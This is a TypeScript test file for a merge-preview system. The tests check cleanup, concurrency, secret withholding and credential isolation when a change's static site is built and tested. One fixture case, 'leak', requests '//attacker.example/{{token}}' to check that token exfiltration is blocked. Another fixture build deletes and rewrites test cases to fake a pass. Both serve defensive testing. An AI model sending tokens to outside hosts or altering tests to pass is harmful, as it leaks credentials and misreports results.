import { after, test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, readlinkSync, symlinkSync } from 'node:fs';
import { mkdir, readFile, readdir, realpath, rm, utimes, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { mergeOne, type MergePorts, type MergeRecordEvent, type MergeTrialRun } from '../src/merge-writer/executor.js';
import { openPreview, previewCheckoutPrefix, previewConcurrency, previewReasonLimit, previewSlots, previewWithheld, sweepPreviewCheckouts, type PreviewInput } from '../src/merge-writer/preview.js';
import { mergeWriterReads } from '../src/daemon/cycle-merge-writer.js';
import { previewVerdictSchema } from '../src/model-boundary/merge-ledger.js';
import { masterConfigSchema } from '../src/master.js';
import type { Application } from '../src/project-applications.js';
import { tempOwnerMarker, tmpReclaimMinAgeMs, writeTempOwner } from '../src/tmp-reclaim.js';
import type { Work } from '../src/model.js';
import { buildStaticSite, type StaticBuildShell } from '../src/release-project.js';
import { loadCases } from '../src/e2e/case.js';
import { runCases } from '../src/e2e/runner.js';
import { temporaryDirectory } from './helpers/temp-dirs.js';
import { workFixture } from './helpers/work-fixture.js';

// GY-1902: a change's preview is checked out, served by `serveHead` and its declared cases run
// against it. GY-3032: no merge is previewed on its own: its trial runs the bound cases against the
// head it serves, once.

const made: string[] = [];
after(async () => { for (const directory of made) await rm(directory, { recursive: true, force: true }); });
const scratch = async (label: string) => { const directory = await realpath(await temporaryDirectory(label)); made.push(directory); return directory; };
const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const sha = (seed: string) => createHash('sha1').update(seed).digest('hex');
const site: Application = { id: 'site', kind: 'static', directory: 'dist', build: 'mkdir -p dist && cp -R site/. dist/' };
/** A preview of `input`'s change running `cases` against its static site, closed once it answers. */
const runPreview = async (input: Omit<PreviewInput, 'application'> & { site?: Application }, cases: readonly string[] = ['scores', 'home']) =>
  (await openPreview({ ...input, application: input.site ?? site }, { keep: false, cases })).verdict;
const copySite: StaticBuildShell = async (_command, cwd) => { execFileSync('sh', ['-c', 'mkdir -p dist && cp -R site/. dist/'], { cwd }); return { ok: true, output: '' }; };

/** A repository whose site serves a score, with a required case reading it and an optional uat case; `best` is the score the merge serves. */
async function repository(label: string, best: unknown, extraCases: Record<string, unknown>[] = []) {
  const root = await scratch(label), repo = join(root, 'repo'), base = join(root, 'worktrees');
  await mkdir(base);
  execFileSync('git', ['init', '-q', '-b', 'main', repo]);
  git(repo, 'config', 'user.email', 't@example.com'); git(repo, 'config', 'user.name', 'T');
  const write = async (path: string, content: unknown) => { await mkdir(join(repo, path, '..'), { recursive: true }); await writeFile(join(repo, path), typeof content === 'string' ? content : `${JSON.stringify(content, null, 2)}\n`); };
  const http = (path: string, expect: unknown[] = []) => ({ kind: 'http', name: `read ${path}`, method: 'GET', path, status: 200, expect });
  await write('site/index.html', '<h1>Play</h1>');
  await write('site/scores.json', { best });
  await write('e2e/cases/scores.json', { id: 'scores', title: 'A player sees the best score', tags: ['api'], target: 'any', required: true, steps: [http('/scores.json', [{ path: 'best', type: 'number' }])] });
  await write('e2e/cases/home.json', { id: 'home', title: 'The home page answers', tags: ['api'], target: 'uat', required: false, steps: [http('/')] });
  for (const entry of extraCases) await write(`e2e/cases/${entry.id}.json`, entry);
  git(repo, 'add', '-A'); git(repo, 'commit', '-q', '-m', 'site and its cases');
  return { repo, base, mergeSha: git(repo, 'rev-parse', 'HEAD') };
}
const previewDirectories = async (base: string) => (await readdir(base)).filter(name => name.startsWith(previewCheckoutPrefix));

// ---- mergeOne against fake ports -----------------------------------------------------------------

// The fixtures' one fixed now: no instant here is compared with the wall clock.
const fixedNow = 1_893_456_000_000, fixedAt = new Date(fixedNow).toISOString();
const tip = sha('tip'), head = sha('head'), mergeSha = sha('merge');
const work = (files: string[] = ['src/game.ts']): Work => workFixture({
  id: 'w1', key: 'GY-1', priority: 1, criteria: [{ id: 'AC-1', text: 'Works', proofs: ['unit:works'] }], stage: 'build', epoch: 1,
  submission: { epoch: 1, pr: 1 }, candidate: { sha: head, baseSha: tip, pr: 1, branch: 'graphyard/gy-1-1', author: 'worker' },
  observation: { source: 'control-plane', candidate: { sha: head, baseSha: tip, pr: 1 }, files, checks: [], reviews: [], merged: false } as never, gates: [], mergeLedger: null,
});
const passingTrial: MergeTrialRun = { build: 'pass', tests: { passed: 3, failed: [], files: 1 }, durationMs: 10, logTail: '', files: ['tests/game.test.ts'], proofs: { 'unit:works': { executed: 1, failed: 0 } } } as MergeTrialRun;
function ports() {
  const events: MergeRecordEvent[] = [], pushes: string[] = [];
  const value: MergePorts = {
    baseBranch: 'main', now: () => fixedNow,
    fetch: async () => pushes.length ? mergeSha : tip,
    merge: async () => ({ mergeSha, files: ['src/game.ts'] }),
    trial: async () => passingTrial,
    push: async sha => { pushes.push(sha); return 'pushed'; },
    holds: async () => false,
    record: async (_item, event) => { events.push(event); return {}; },
  };
  return { value, events, pushes };
}

test('unit:merge-preview — a merge is served and tested once, by its trial: the merge writer\'s ports hold no per-merge preview, even for a repository naming GRAPHYARD_UAT_STATIC, and a passing trial lands with no preview recorded', async () => {
  const config = masterConfigSchema.parse({ version: 1, url: 'https://graphyard.example', credentialFile: '/outside/coordinator.token', cliPath: '/bin/graphyard',
    repository: 'owner/project', baseBranch: 'main', githubAppId: 1234, hostId: 'machine-a', masterAgentName: 'graphyard-master-project', workers: [] });
  const reads = mergeWriterReads(config, '/repo', async () => '', { base: '/worktrees', record: async () => ({}), environment: { GRAPHYARD_UAT_STATIC: 'dist', GRAPHYARD_UAT_BUILD: 'npm run build:site' } });
  assert.equal('preview' in reads, false, 'the merge writer previews no merge on its own');
  const landing = ports();
  assert.equal((await mergeOne(landing.value, work())).outcome, 'merged');
  assert.deepEqual(landing.events.map(event => event.kind), ['intent', 'trial', 'pushed', 'reconciled']);
  assert.ok(landing.events.every(event => !('preview' in event)), 'no trial record carries a preview');
  assert.deepEqual(landing.pushes, [mergeSha]);
});

test('unit:preview-failing-case-fails — a change\'s static site is built and served, its declared cases run against it, and a failing case fails the preview naming it', { timeout: 60_000 }, async () => {
  // The real preview: a checkout of the change, the site built and served, the cases run over HTTP.
  const broken = await repository('preview-broken', 'none');
  const failed = await runPreview({ root: broken.repo, base: broken.base, mergeSha: broken.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
  assert.equal(failed.result, 'fail', failed.detail);
  assert.deepEqual(failed.failed, ['scores'], 'the failing case is named');
  assert.deepEqual(failed.cases.map(entry => [entry.case, entry.verdict]).sort(), [['home', 'passed'], ['scores', 'failed']], 'every declared case ran');
  assert.equal(failed.mergeSha, broken.mergeSha);
  const fine = await repository('preview-fine', 42);
  const passed = await runPreview({ root: fine.repo, base: fine.base, mergeSha: fine.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000 });
  assert.equal(passed.result, 'pass', passed.detail);
  assert.deepEqual(passed.failed, []);

  // A declared case declaring an install secret cannot run on the preview, so it fails the preview naming the case.
  const secretOnly = await repository('preview-secret-only', 42, [{ id: 'checkout', title: 'A player pays', tags: ['api'], target: 'any', required: true, secrets: ['STRIPE_KEY'],
    steps: [{ kind: 'http', method: 'GET', path: '/{{secret:STRIPE_KEY}}', status: 200 }] }]);
  const withheld = await runPreview({ root: secretOnly.repo, base: secretOnly.base, mergeSha: secretOnly.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000 }, ['scores', 'checkout']);
  assert.equal(withheld.result, 'fail', withheld.detail);
  assert.deepEqual(withheld.failed, ['checkout'], 'the withheld case is the failure');
  assert.match(withheld.cases.find(entry => entry.case === 'checkout')!.reason!, /STRIPE_KEY.*withholds/);
  assert.match(withheld.detail, /E2E case checkout declares an install secret the preview withholds/);
  // However many and however long the secret names a case declares, its withheld reason fits the record, naming as many as fit and counting the rest.
  const manySecrets = Array.from({ length: 20 }, (_, index) => `SECRET_${String(index).padStart(2, '0')}_${'X'.repeat(90)}`);
  const longReason = previewWithheld({ definition: { id: 'many', required: false, target: 'uat', secrets: manySecrets } } as unknown as Parameters<typeof previewWithheld>[0])!;
  assert.ok(longReason.length <= previewReasonLimit, `${longReason.length} characters`);
  assert.match(longReason, /^declares the install secrets SECRET_00_X+, .*and \d+ more, which the preview withholds/);
  assert.doesNotThrow(() => previewVerdictSchema.parse({ result: 'pass', mergeSha, detail: '', durationMs: 0, failed: [], cases: [{ case: 'many', verdict: 'unrun', required: false, reason: longReason }] }));

  // The change's own case file that does not load fails the preview, and its checkout is removed.
  const malformed = await repository('preview-malformed', 42);
  await writeFile(join(malformed.repo, 'e2e', 'cases', 'broken.json'), '{ not json');
  git(malformed.repo, 'add', '-A'); git(malformed.repo, 'commit', '-q', '-m', 'a broken case');
  const unloadable = await runPreview({ root: malformed.repo, base: malformed.base, mergeSha: git(malformed.repo, 'rev-parse', 'HEAD'), timeoutMs: 30_000, stepTimeoutMs: 5_000 });
  assert.equal(unloadable.result, 'fail', unloadable.detail);
  assert.deepEqual(unloadable.failed, ['cases']);
  assert.match(unloadable.detail, /E2E cases do not load/);
  assert.deepEqual(await previewDirectories(malformed.base), []);
  // A declared case the change deleted fails the preview naming it: nothing passes vacuously.
  const emptied = await repository('preview-emptied', 42);
  git(emptied.repo, 'rm', '-q', 'e2e/cases/scores.json', 'e2e/cases/home.json'); git(emptied.repo, 'commit', '-q', '-m', 'delete every case');
  const vacuous = await runPreview({ root: emptied.repo, base: emptied.base, mergeSha: git(emptied.repo, 'rev-parse', 'HEAD'), timeoutMs: 30_000, stepTimeoutMs: 5_000 });
  assert.equal(vacuous.result, 'fail', vacuous.detail);
  assert.deepEqual(vacuous.failed, ['scores', 'home']);
});

test('unit:preview-cases-kept-from-merge — the change\'s declared cases are loaded before its build runs and that set is the one run: a build that erases or rewrites a case file cannot turn a failing case into a passing preview', { timeout: 60_000 }, async () => {
  const broken = await repository('preview-cases-erased', 'none');
  // The build erases the failing required case and rewrites the other to one that passes trivially, then builds the site.
  const tampering: StaticBuildShell = async (_command, cwd) => {
    execFileSync('sh', ['-c', 'rm -f e2e/cases/scores.json && printf %s "$1" > e2e/cases/home.json && mkdir -p dist && cp -R site/. dist/', 'sh',
      JSON.stringify({ id: 'home', title: 'Rewritten', tags: ['api'], target: 'uat', required: false, steps: [{ kind: 'http', method: 'GET', path: '/', status: 200 }] })], { cwd });
    assert.equal(existsSync(join(cwd, 'e2e', 'cases', 'scores.json')), false);
    return { ok: true, output: '' };
  };
  const verdict = await runPreview({ root: broken.repo, base: broken.base, mergeSha: broken.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: tampering });
  assert.equal(verdict.result, 'fail', verdict.detail);
  assert.deepEqual(verdict.failed, ['scores'], 'the required case the build erased still ran, and failed');
  assert.deepEqual(verdict.cases.map(entry => [entry.case, entry.verdict]).sort(), [['home', 'passed'], ['scores', 'failed']], 'the change\'s committed case set ran, not the build\'s');
  // A build that only erases every case cannot make a vacuous pass either.
  const erasing: StaticBuildShell = async (_command, cwd) => { execFileSync('sh', ['-c', 'rm -rf e2e && mkdir -p dist && cp -R site/. dist/'], { cwd }); return { ok: true, output: '' }; };
  const erased = await runPreview({ root: broken.repo, base: broken.base, mergeSha: broken.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: erasing });
  assert.equal(erased.result, 'fail', erased.detail);
  assert.deepEqual(erased.failed, ['scores']);
});

test('unit:preview-capped-and-cleaned-up — at most two previews run at once; each is closed and its checkout removed on pass, fail and timeout; the startup sweep removes a preview checkout whose owner process is gone', { timeout: 60_000 }, async () => {
  assert.equal(previewConcurrency, 2);
  const fixture = await repository('preview-cap', 42);
  // Three previews at once on one slot pool: the third builds only after one of the first two ends.
  const slots = previewSlots();
  let active = 0, most = 0;
  const gates: (() => void)[] = [];
  const blockingShell: StaticBuildShell = async (command, cwd) => {
    active++; most = Math.max(most, active);
    await new Promise<void>(accept => gates.push(accept));
    await copySite(command, cwd); active--;
    return { ok: true, output: '' };
  };
  const runs = [0, 1, 2].map(() => runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: blockingShell, slots }));
  // A run that rejects fails the test where it is awaited, never as an unhandled rejection.
  for (const run of runs) run.catch(() => {});
  const until = async (done: () => boolean) => { for (let index = 0; index < 400 && !done(); index++) await new Promise(accept => setTimeout(accept, 25)); assert.ok(done()); };
  await until(() => gates.length === 2);
  await new Promise(accept => setTimeout(accept, 200));
  assert.equal(gates.length, 2, 'the third preview waits for a slot');
  gates.shift()!();
  await until(() => gates.length === 2);
  while (gates.length) gates.shift()!();
  await until(() => !gates.length && active === 0);
  for (const verdict of await Promise.all(runs)) assert.equal(verdict.result, 'pass', verdict.detail);
  assert.equal(most, 2, 'never more than two previews at once');
  assert.equal(slots.running, 0, 'every slot freed');
  assert.deepEqual(await previewDirectories(fixture.base), [], 'every passing preview\'s checkout removed');

  // Fail: the build fails; timeout: the build never ends within the budget. Either way the checkout goes.
  const failedBuild = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, timeoutMs: 30_000, shell: async () => ({ ok: false, output: 'boom' }) });
  assert.equal(failedBuild.result, 'fail'); assert.deepEqual(failedBuild.failed, ['build']);
  assert.deepEqual(await previewDirectories(fixture.base), []);
  // Timeout in the build: the build is cancelled, and its late continuation still holds the slot and the checkout until it ends.
  const timeoutSlots = previewSlots();
  let buildCancelled = false, buildEnded = false;
  const lateBuild = runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, timeoutMs: 5_000, slots: timeoutSlots,
    shell: async (_command, cwd, signal) => {
      await new Promise<void>(accept => signal!.addEventListener('abort', () => accept(), { once: true }));
      buildCancelled = true;
      // The late continuation: the build takes another moment to wind down after its cancellation.
      await new Promise(accept => setTimeout(accept, 400));
      assert.equal(timeoutSlots.running, 1, 'the slot is held while the cancelled build winds down');
      assert.ok(existsSync(cwd), 'the checkout the cancelled build runs in is not removed under it');
      buildEnded = true;
      return { ok: true, output: '' };
    } });
  const timedOut = await lateBuild;
  assert.equal(timedOut.result, 'timeout');
  assert.ok(buildCancelled && buildEnded, `the timed-out build was cancelled and had ended before the preview answered: ${timedOut.detail}`);
  assert.equal(timeoutSlots.running, 0);
  assert.deepEqual(await previewDirectories(fixture.base), [], 'a timed-out preview\'s checkout is removed');
  // Timeout in the cases: in-flight requests are aborted, no further case or retry starts, and the run ends before the slot is freed.
  const caseSlots = previewSlots();
  let requests = 0, aborted = 0, afterTimeout = 0, expiredAt = 0;
  const hangingFetcher: typeof fetch = async (input, init) => {
    requests++;
    if (expiredAt) afterTimeout++;
    if (String(input).endsWith('/healthz')) return fetch(input, init);
    return new Promise<Response>((_, reject) => init!.signal!.addEventListener('abort', () => { aborted++; expiredAt ||= Date.now(); reject(new Error('aborted')); }, { once: true }));
  };
  const caseTimeout = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, timeoutMs: 1_500, stepTimeoutMs: 20_000, shell: copySite, fetcher: hangingFetcher, slots: caseSlots });
  assert.equal(caseTimeout.result, 'timeout', caseTimeout.detail);
  assert.ok(requests >= 2 && aborted === 1, `the in-flight case request was aborted (${requests} requests, ${aborted} aborted)`);
  assert.equal(afterTimeout, 0, 'no case, attempt or step started after the budget ran out');
  assert.equal(caseSlots.running, 0);
  assert.deepEqual(await previewDirectories(fixture.base), []);
  assert.equal(git(fixture.repo, 'worktree', 'list').split('\n').length, 1, 'git keeps no record of any preview checkout');

  // The default build shell kills the build's whole process group, descendants included, on cancellation and at its timeout.
  const buildDirectory = await scratch('preview-build-group');
  for (const [label, cancelAfter] of [['cancelled', 300], ['timed-out', 0]] as const) {
    const orphan = join(buildDirectory, `${label}-orphan`);
    const controller = new AbortController();
    if (cancelAfter) setTimeout(() => controller.abort(), cancelAfter);
    const buildFailed = await buildStaticSite(`(sleep 3 && touch ${orphan}) & sleep 30`, buildDirectory, cancelAfter ? 30_000 : 500, undefined, controller.signal, { PATH: process.env.PATH! });
    assert.ok(buildFailed, `the ${label} build fails`);
    let left = '';
    try { left = execFileSync('pgrep', ['-f', `touch ${orphan}`], { encoding: 'utf8' }).trim(); } catch { /* pgrep exits 1 when nothing matches */ }
    assert.equal(left, '', `no descendant of the ${label} build outlives it`);
  }
  await new Promise(accept => setTimeout(accept, 3_500));
  for (const label of ['cancelled', 'timed-out']) assert.equal(existsSync(join(buildDirectory, `${label}-orphan`)), false, `the ${label} build's background child never ran on`);
  assert.equal(await buildStaticSite('echo built', buildDirectory, 5_000), null, `a build exiting zero passes (${existsSync(buildDirectory)})`);

  // The startup sweep: a fabricated leftover whose owner is gone goes; a live owner's and an unmarked one stay.
  const base = await scratch('preview-sweep'), proc = await scratch('preview-proc');
  const dead = join(base, `${previewCheckoutPrefix}dead`), live = join(base, `${previewCheckoutPrefix}live`), unmarked = join(base, `${previewCheckoutPrefix}unmarked`), other = join(base, 'trial-other');
  for (const directory of [dead, live, unmarked, other]) { await mkdir(join(directory, 'checkout'), { recursive: true }); await writeFile(join(directory, 'checkout', 'index.html'), 'left behind'); }
  await writeFile(tempOwnerMarker(dead), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: fixedAt })}\n`);
  await writeFile(tempOwnerMarker(other), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, at: fixedAt })}\n`);
  await writeTempOwner(live);
  await mkdir(join(proc, String(process.pid)));
  await writeFile(join(proc, String(process.pid), 'stat'), (await import('node:fs')).readFileSync(`/proc/${process.pid}/stat`, 'utf8'));
  assert.deepEqual(await sweepPreviewCheckouts(base, { procRoot: proc }), [dead]);
  assert.equal(existsSync(dead), false); assert.equal(existsSync(tempOwnerMarker(dead)), false, 'the marker goes with it');
  for (const kept of [live, unmarked, other]) assert.ok(existsSync(kept), `${kept} is kept`);
});

test('unit:preview-sweep-judges-unjudgeable-markers-as-ownerless — a foreign-namespace and a namespace-less marker keep their checkouts while young and lose them once old and unheld', { timeout: 30_000 }, async () => {
  // GY-1896 review: the sweep's only removal rule was a pid lookup, and a marker from another PID
  // namespace — a merge writer that restarted in another sandbox — or one written before namespaces
  // were kept can never be judged by it, so its checkout, marker and git registration piled up
  // forever under the managed worktree root, which the /tmp reclaim pass never scans. The sweep now
  // judges such a marker as an ownerless directory is (reclaimRoot): kept while young, gone once
  // old and nothing live holds it.
  const base = await scratch('preview-sweep-ns'), proc = await scratch('preview-sweep-ns-proc');
  // A reader that can name its own PID namespace, as a real Linux /proc lets it.
  mkdirSync(join(proc, 'self', 'ns'), { recursive: true });
  const reader = readlinkSync('/proc/self/ns/pid');
  symlinkSync(reader, join(proc, 'self', 'ns', 'pid'));
  const foreign = reader === 'pid:[4026531836]' ? 'pid:[4026539999]' : 'pid:[4026531836]';
  const foreignMarked = join(base, `${previewCheckoutPrefix}foreign-ns`), namespaceless = join(base, `${previewCheckoutPrefix}pre-namespace`);
  for (const directory of [foreignMarked, namespaceless]) { await mkdir(join(directory, 'checkout'), { recursive: true }); await writeFile(join(directory, 'checkout', 'index.html'), 'left behind'); }
  await writeFile(tempOwnerMarker(foreignMarked), `${JSON.stringify({ pid: 4_194_000, startedAt: 1, pidNamespace: foreign, at: new Date().toISOString() })}\n`);
  await writeFile(tempOwnerMarker(namespaceless), `${JSON.stringify({ pid: 4_194_001, startedAt: 1, at: new Date().toISOString() })}\n`);
  // Young: the writer may be running where this reader cannot see pids, so both stand, markers with them.
  assert.deepEqual(await sweepPreviewCheckouts(base, { procRoot: proc }), []);
  for (const kept of [foreignMarked, namespaceless]) assert.ok(existsSync(kept) && existsSync(tempOwnerMarker(kept)), `${kept} is kept while young`);
  // Old and unheld: hours past any live preview, both go, markers with them.
  const past = new Date(Date.now() - tmpReclaimMinAgeMs - 3_600_000);
  for (const directory of [foreignMarked, namespaceless]) {
    await utimes(directory, past, past);
    await utimes(join(directory, 'checkout'), past, past);
    await utimes(join(directory, 'checkout', 'index.html'), past, past);
  }
  assert.deepEqual(await sweepPreviewCheckouts(base, { procRoot: proc }), [foreignMarked, namespaceless]);
  for (const gone of [foreignMarked, namespaceless]) { assert.equal(existsSync(gone), false); assert.equal(existsSync(tempOwnerMarker(gone)), false, 'the marker goes with it'); }
});

test('unit:preview-sweep-keeps-held-checkout-under-symlinked-base — an old unjudgeable marker under a symlink base stays while a live holder names only the resolved path', { timeout: 30_000 }, async () => {
  // GY-1896 review of 919ad4662aad: heldEntries(real, all) recorded the resolved candidate, but the
  // membership check used only join(base, name). With base a symlink, a holder whose cwd/fd is the
  // resolved checkout never matched, so the age-and-holder fallback deleted a live preview.
  const root = await scratch('preview-sweep-symlink'), real = join(root, 'real'), link = join(root, 'link');
  await mkdir(real); symlinkSync(real, link);
  const proc = await scratch('preview-sweep-symlink-proc');
  mkdirSync(join(proc, 'self', 'ns'), { recursive: true });
  const reader = readlinkSync('/proc/self/ns/pid');
  symlinkSync(reader, join(proc, 'self', 'ns', 'pid'));
  const foreign = reader === 'pid:[4026531836]' ? 'pid:[4026539999]' : 'pid:[4026531836]';
  const name = `${previewCheckoutPrefix}held-through-realpath`;
  const throughLink = join(link, name), resolved = join(real, name);
  await mkdir(join(resolved, 'checkout'), { recursive: true });
  await writeFile(join(resolved, 'checkout', 'index.html'), 'in use');
  await writeFile(tempOwnerMarker(throughLink), `${JSON.stringify({ pid: 4_194_002, startedAt: 1, pidNamespace: foreign, at: new Date().toISOString() })}\n`);
  const past = new Date(Date.now() - tmpReclaimMinAgeMs - 3_600_000);
  for (const path of [resolved, join(resolved, 'checkout'), join(resolved, 'checkout', 'index.html')]) await utimes(path, past, past);
  // A live process holds the checkout only under its resolved spelling — what /proc reports for cwd.
  const holderPid = 4_194_100;
  mkdirSync(join(proc, String(holderPid)), { recursive: true });
  symlinkSync(resolved, join(proc, String(holderPid), 'cwd'));
  assert.deepEqual(await sweepPreviewCheckouts(link, { procRoot: proc }), []);
  assert.ok(existsSync(resolved) && existsSync(tempOwnerMarker(throughLink)), 'a live holder through the resolved path keeps the checkout');
  // Drop the holder: the same old unjudgeable marker then goes, as an unheld ownerless directory would.
  await rm(join(proc, String(holderPid)), { recursive: true, force: true });
  assert.deepEqual(await sweepPreviewCheckouts(link, { procRoot: proc }), [throughLink]);
  assert.equal(existsSync(resolved), false);
  assert.equal(existsSync(tempOwnerMarker(throughLink)), false);
});

test('unit:preview-holds-no-coordinator-credential — the merge\'s build runs with the host basics only, its cases with a throwaway token whose requests stay on the served origin, and a cancelled preview kills its command steps\' processes', { timeout: 60_000 }, async () => {
  // The build and the cases' processes: a candidate's script sees PATH and a throwaway HOME, never the coordinator's credentials, home or runtime sockets.
  const seen = join(await scratch('preview-seen'), 'environment');
  const fixture = await repository('preview-isolated', 42, [{ id: 'environment', title: 'A command reading its environment', tags: ['api'], target: 'uat', required: false,
    steps: [{ kind: 'command', run: `printf '%s|%s|%s|%s' "$HOME" "$XDG_RUNTIME_DIR" "$XDG_CONFIG_HOME" "$GRAPHYARD_UAT_TOKEN" > ${seen}`, timeoutSeconds: 30 }] },{ id: 'leak', title: 'A case reaching for another host', tags: ['api'], target: 'uat', required: true,
    steps: [{ kind: 'http', method: 'GET', path: '//attacker.example/{{token}}', status: 200 }] },
  { id: 'needs-secret', title: 'A case declaring an install secret', tags: ['api'], target: 'uat', required: false, secrets: ['API_KEY'],
    steps: [{ kind: 'http', method: 'GET', path: '/{{secret:API_KEY}}', status: 200 }] }]);
  const host = { PATH: process.env.PATH, HOME: '/home/builder', XDG_RUNTIME_DIR: '/run/user/1000', DISPLAY: ':0', GRAPHYARD_UAT_TOKEN: 'uat-secret', GITHUB_TOKEN: 'gh-secret', GRAPHYARD_TOKEN: 'gy-secret' };
  let buildEnvironment: NodeJS.ProcessEnv | undefined;
  const recordingShell: StaticBuildShell = async (command, cwd, _signal, env) => { buildEnvironment = env; return copySite(command, cwd); };
  const requested: { url: string; authorization: string }[] = [];
  const recordingFetcher: typeof fetch = async (input, init) => {
    requested.push({ url: String(input), authorization: String(new Headers(init?.headers).get('authorization')) });
    return fetch(input, init);
  };
  const verdict = await runPreview({ root: fixture.repo, base: fixture.base, mergeSha: fixture.mergeSha, timeoutMs: 30_000, stepTimeoutMs: 5_000, shell: recordingShell, fetcher: recordingFetcher, hostEnvironment: host }, ['scores', 'environment', 'leak']);
  const home = buildEnvironment?.HOME ?? '';
  assert.ok(home.startsWith(join(fixture.base, previewCheckoutPrefix)) && home.endsWith('/home'), `the build's HOME is the preview's own: ${home}`);
  assert.deepEqual(buildEnvironment, { PATH: process.env.PATH, PLAYWRIGHT_BROWSERS_PATH: '/home/builder/.cache/ms-playwright', HOME: home, XDG_CONFIG_HOME: join(home, '.config'), XDG_CACHE_HOME: join(home, '.cache'),
    XDG_DATA_HOME: join(home, '.local', 'share'), XDG_STATE_HOME: join(home, '.local', 'state'), TMPDIR: join(home, 'tmp') }, 'the build holds no coordinator credential, home, runtime directory or display');
  const [caseHome, runtime, config, token] = (await readFile(seen, 'utf8')).split('|');
  // XDG_CONFIG_HOME unset falls back to the throwaway HOME's own .config.
  assert.deepEqual([caseHome, runtime, config, token], [home, '', '', ''], 'a command case runs in the same throwaway home, with no runtime directory or token');
  assert.ok(!existsSync(home), 'the throwaway home is removed with the checkout');
  assert.equal(verdict.result, 'fail', verdict.detail);
  assert.deepEqual(verdict.failed, ['leak'], 'a case leaving the served origin fails without sending its request');
  assert.ok(requested.length > 0 && requested.every(request => new URL(request.url).hostname === '127.0.0.1'), JSON.stringify(requested));
  assert.ok(requested.every(request => !/uat-secret|gh-secret|gy-secret/.test(request.authorization)), 'no coordinator token is sent');
  assert.ok(requested.some(request => /^Bearer preview-/.test(request.authorization)), 'the cases carry the preview\'s own token');
  // And a run that withholds secrets never hands one to a case, though the install's file holds it.
  const secrets = await scratch('preview-secrets');
  await writeFile(join(secrets, 'e2e-secrets.uat.env'), 'API_KEY=install-secret\n', { mode: 0o600 });
  const withheld = await runCases(await loadCases(fixture.repo), { url: 'http://127.0.0.1:9', token: 'preview-token', root: fixture.repo, secretsDirectory: secrets, withholdSecrets: true, stepTimeoutMs: 1_000, fetcher: recordingFetcher });
  const declared = withheld.cases.find(entry => entry.id === 'needs-secret')!;
  assert.equal(declared.verdict, 'failed');
  assert.match(declared.failingStep!.reason, /API_KEY is withheld/);
  assert.ok(requested.every(request => !request.url.includes('install-secret')), 'no install secret reaches a request');

  // A command step in flight when the budget runs out: its process group is killed and the slot freed at once, not at the step's own ten-minute timeout.
  const marker = join(await scratch('preview-command'), 'still-running');
  const hanging = await repository('preview-command', 42, [{ id: 'hang', title: 'A command that never ends', tags: ['api'], target: 'uat', required: true,
    steps: [{ kind: 'command', run: `sleep 30 && touch ${marker}`, timeoutSeconds: 600 }] }]);
  const slots = previewSlots(), began = Date.now();
  const timedOut = await runPreview({ root: hanging.repo, base: hanging.base, mergeSha: hanging.mergeSha, timeoutMs: 2_000, stepTimeoutMs: 5_000, shell: copySite, slots }, ['hang']);
  assert.equal(timedOut.result, 'timeout', timedOut.detail);
  assert.ok(Date.now() - began < 10_000, `the preview ended at its budget, not the command's (${Date.now() - began} ms)`);
  assert.equal(slots.running, 0);
  assert.deepEqual(await previewDirectories(hanging.base), []);
  let sleepers = '';
  try { sleepers = execFileSync('pgrep', ['-f', `sleep 30 && touch ${marker}`], { encoding: 'utf8' }).trim(); } catch { /* pgrep exits 1 when nothing matches */ }
  assert.equal(sleepers, '', 'no process of the cancelled command step outlives the preview');
});
